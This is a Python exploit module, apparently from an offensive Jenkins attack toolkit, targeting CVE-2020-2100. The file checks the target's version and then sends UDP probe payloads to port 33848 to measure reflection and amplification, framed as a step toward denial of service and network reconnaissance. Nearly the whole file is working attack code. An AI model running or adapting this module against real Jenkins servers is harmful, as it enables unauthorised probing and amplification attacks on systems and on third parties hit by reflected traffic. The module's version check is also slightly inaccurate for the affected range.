"""
CVE-2020-2100: Jenkins UDP Amplification Reflection DoS

This vulnerability allows triggering a UDP-based amplification attack that can be used
for reconnaissance or as part of a DoS chain.
"""

import socket
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2020_2100(ExploitModule):
    """Jenkins UDP amplification vulnerability for DoS and network reconnaissance."""

    CVE_ID = "CVE-2020-2100"

    METADATA = ExploitMetadata(
        cve_id="CVE-2020-2100",
        name="Jenkins UDP Amplification Reflection Attack",
        description="UDP amplification vulnerability allowing DoS and network reconnaissance",
        affected_versions=["< 2.204.2", ">= 2.205 < 2.219"],
        mitre_attack=["T1499", "T1046"],
        severity="medium",
        references=[
            "https://www.jenkins.io/security/advisory/2020-01-29/",
            "https://nvd.nist.gov/vuln/detail/CVE-2020-2100",
            "https://github.com/advisories/GHSA-gpxv-776p-7gc7"
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["dos", "reconnaissance", "network"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if potentially vulnerable, False otherwise
        """
        try:
            response = session.get("/api/json")

            if response.status_code == 200:
                data = response.json()
                version = data.get('version', '')

                if version:
                    version_parts = version.split('.')
                    try:
                        major = int(version_parts[0])
                        minor = int(version_parts[1]) if len(version_parts) > 1 else 0

                        if major == 2 and minor < 204:
                            return True
                        elif major == 2 and 205 <= minor < 219:
                            return True
                    except (ValueError, IndexError):
                        pass

            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2020-2100 for UDP reflection reconnaissance.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (udp_port)

        Returns:
            ExploitResult: Result of the exploit
        """
        udp_port = kwargs.get('udp_port', 33848)
        target_host = session.base_url.split('//')[1].split(':')[0] if '//' in session.base_url else session.base_url.split(':')[0]

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)

            probe_messages = [
                b'\x00\x00\x00\x00',
                b'Jenkins',
                b'\x00\x01\x00\x00',
            ]

            responses = []

            for idx, probe in enumerate(probe_messages):
                try:
                    sock.sendto(probe, (target_host, udp_port))

                    try:
                        data, addr = sock.recvfrom(1024)
                        responses.append({
                            "probe": idx + 1,
                            "response_size": len(data),
                            "amplification_factor": len(data) / len(probe) if len(probe) > 0 else 0
                        })
                    except socket.timeout:
                        pass
                except Exception:
                    pass

            sock.close()

            if responses:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"UDP reflection detected with {len(responses)} responding probes",
                    data={
                        "target": target_host,
                        "port": udp_port,
                        "responses": responses,
                        "max_amplification": max([r["amplification_factor"] for r in responses]) if responses else 0
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="No UDP reflection responses received"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"UDP test failed: {str(e)}"
            )
